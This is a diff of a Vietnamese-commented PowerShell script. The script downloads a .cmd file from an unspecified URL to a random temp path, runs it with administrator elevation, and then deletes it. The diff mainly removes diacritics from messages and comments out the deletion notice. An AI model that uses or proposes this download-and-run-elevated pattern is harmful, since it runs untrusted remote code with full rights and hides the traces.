@@ -13,30 +13,34 @@ $tempPath = Join-Path $env:TEMP "x_$rand.cmd"
 # Tải file
 try {
     Invoke-WebRequest -Uri $url -OutFile $tempPath -ErrorAction Stop
-    Write-Host "Tải file thành công: $tempPath"
+    Write-Host "Tai file thanh cong: $tempPath"
 } catch {
-    Write-Error "Không thể tải file từ $url"
+    Write-Error "Khong the tai file từ $url"
     return
 }
 
 # Kiểm tra file đã được tạo chưa
 if (-not (Test-Path $tempPath)) {
-    Write-Error "File không tồn tại sau khi tải về. Dừng lại."
+    Write-Error "File khong ton tai sau khi tai ve. Dung lai."
     return
 }
 
 # Thực thi file với quyền admin
+
 try {
+# Nếu không muốn chuyển admin thì thay Start-Process -FilePath "cmd.exe" ... thì thay thành & cmd.exe /c "`"$tempPath`""
+#    & cmd.exe /c "`"$tempPath`""
     Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$tempPath`"" -Verb RunAs -Wait
 } catch {
-    Write-Error "Không thể thực thi file: $($_.Exception.Message)"
+    Write-Error "Khong the thuc thi file: $($_.Exception.Message)"
     return
 }
 
 # Xoá file sau khi thực thi xong
 try {
     Remove-Item $tempPath -Force
-    Write-Host "Đã xoá file: $tempPath"
+#    Write-Host "Đã xoá file: $tempPath"
 } catch {
-    Write-Warning "Không thể xoá file: $($_.Exception.Message)"
+    Write-Warning "Khong the xoa file: $($_.Exception.Message)"
 }
+
